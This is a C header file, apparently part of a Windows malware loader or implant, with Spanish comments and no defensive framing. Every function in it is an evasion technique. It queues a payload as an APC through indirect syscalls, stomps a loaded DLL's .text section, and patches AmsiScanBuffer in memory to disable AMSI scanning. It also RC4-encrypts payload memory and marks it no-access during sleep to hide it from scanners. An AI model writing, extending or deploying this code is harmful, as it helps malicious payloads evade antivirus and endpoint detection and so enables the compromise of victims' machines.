#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "api_hashes.h"
#include "syscalls.h"

// =============================================================================
// ESTRUCTURAS
// =============================================================================

typedef struct _STOMP_CONTEXT {
    PVOID BaseAddress;
    SIZE_T RegionSize;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_SECTION_HEADER TextSection;
    PVOID OriginalText;
} STOMP_CONTEXT, *PSTOMP_CONTEXT;

typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef struct _API_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtQueueApcThread;
    SYSCALL_ENTRY NtGetContextThread;
    SYSCALL_ENTRY NtSetContextThread;
    SYSCALL_ENTRY NtWaitForSingleObject;
    ULONG_PTR CreateWaitableTimerW;
    ULONG_PTR SetWaitableTimer;
    ULONG_PTR SystemFunction032;
} API_TABLE;

// Declaraciones globales compartidas
extern PVOID g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// THREADLESS EXECUTION (APC INJECTION)
// =============================================================================

static void ThreadlessExecute(PVOID pPayload) {
    THREADENTRY32 te; te.dwSize = sizeof(te);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        if (Thread32First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == GetCurrentProcessId() && te.th32ThreadID != GetCurrentThreadId()) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                    if (hThread) {
                        InvokeSyscall(g_ApiTable.NtQueueApcThread.ssn, g_SyscallGadget, hThread, pPayload, NULL, NULL, NULL);
                        CloseHandle(hThread);
                        break;
                    }
                }
            } while (Thread32Next(hSnap, &te));
        }
        CloseHandle(hSnap);
    }
}

// =============================================================================
// MODULE STOMPING ROBUSTO
// =============================================================================

static BOOL ModuleStompRobust(LPCWSTR targetDll, SIZE_T payloadSize, PSTOMP_CONTEXT ctx) {
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
    typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
    LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
    HMODULE hModule = pLoadLibraryW(targetDll);
    if (!hModule) return FALSE;
    
    ctx->BaseAddress = (PVOID)hModule;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    ctx->NtHeaders = pNt;
    
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, STOBFS_A(".text"), 5) == 0) {
            ctx->TextSection = &pSection[i];
            ctx->RegionSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }
    
    if (!ctx->TextSection || payloadSize > ctx->RegionSize) return FALSE;
    
    PVOID pText = (PBYTE)ctx->BaseAddress + ctx->TextSection->VirtualAddress;
    ULONG oldProtect = 0;
    SIZE_T regionSize = ctx->RegionSize;
    
    InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pText, &regionSize, PAGE_READWRITE, &oldProtect);
    
    return TRUE;
}

// =============================================================================
// AMSI BYPASS ROBUSTO
// =============================================================================

static BOOL BypassAMSI_DataOnlyRobust() {
    LDR_DATA_TABLE_ENTRY_PTR *pMod = NULL;
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;
    PVOID hAmsi = NULL;
    
    while (pEntry != pHead) {
        pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
        if (pMod->BaseDllName.Buffer && pMod->BaseDllName.Buffer[0] == L'a') {
            hAmsi = pMod->DllBase;
            break;
        }
        pEntry = pEntry->Flink;
    }
    
    if (!hAmsi) {
        PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
        LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
        hAmsi = pLoadLibraryW(STOBFS_W(L"amsi.dll"));
    }
    if (!hAmsi) return FALSE;
    
    PVOID pAmsiScanBuffer = ResolveApiByHash(hAmsi, HASH_AmsiScanBuffer);
    if (pAmsiScanBuffer) {
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 
        ULONG oldProtect = 0;
        SIZE_T patchSize = sizeof(patch);
        PVOID pPatchAddr = pAmsiScanBuffer;
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pPatchAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pPatchAddr, &patchSize, oldProtect, &oldProtect);
        return TRUE;
    }
    return FALSE;
}

// =============================================================================
// ACTIVE SLEEP MASKING (SLEEP OBFUSCATION)
// =============================================================================

static void ActiveSleepMask(DWORD dwMs, PVOID pAddress, SIZE_T sSize) {
    HANDLE hTimer = NULL;
    LARGE_INTEGER li;
    li.QuadPart = -(int64_t)dwMs * 10000; 

    typedef HANDLE (WINAPI *CreateWaitableTimerW_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
    typedef BOOL (WINAPI *SetWaitableTimer_t)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL);
    typedef NTSTATUS (WINAPI *SystemFunction032_t)(USTRING*, USTRING*);

    CreateWaitableTimerW_t pCreateWaitableTimerW = (CreateWaitableTimerW_t)g_ApiTable.CreateWaitableTimerW;
    SetWaitableTimer_t pSetWaitableTimer = (SetWaitableTimer_t)g_ApiTable.SetWaitableTimer;
    SystemFunction032_t pSystemFunction032 = (SystemFunction032_t)g_ApiTable.SystemFunction032;

    hTimer = pCreateWaitableTimerW(NULL, TRUE, NULL);
    if (hTimer) {
        if (pSetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE)) {
            ULONG old;
            USTRING data = { (DWORD)sSize, (DWORD)sSize, pAddress };
            USTRING key = { 16, 16, (PVOID)"\x13\x37\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\x01\x23\x45\x67\x89\xAB" };
            
            // 1. Cifrado RC4 (SystemFunction032)
            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);
            pSystemFunction032(&data, &key);
            
            // 2. Enmascaramiento de permisos
            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_NOACCESS, &old);

            // 3. Espera nativa
            InvokeSyscall(g_ApiTable.NtWaitForSingleObject.ssn, g_SyscallGadget, hTimer, FALSE, NULL);

            // 4. Restauración y descifrado
            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);
            pSystemFunction032(&data, &key);
            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_EXECUTE_READ, &old);
        }
        CloseHandle(hTimer);
    }
}

#endif
